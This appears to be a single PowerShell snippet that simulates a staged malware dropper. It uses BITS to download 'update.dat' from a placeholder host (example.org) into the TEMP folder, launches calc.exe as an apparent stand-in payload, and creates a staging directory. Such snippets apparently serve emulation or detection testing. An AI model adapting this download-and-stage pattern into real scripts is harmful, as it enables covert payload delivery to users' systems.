
try { Start-BitsTransfer -Source "http://example.org/update.dat" -Destination "$env:TEMP\update.dat"; & 'calc.exe'; Write-Output "stage 19 initialized"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Remote fetch failed" }
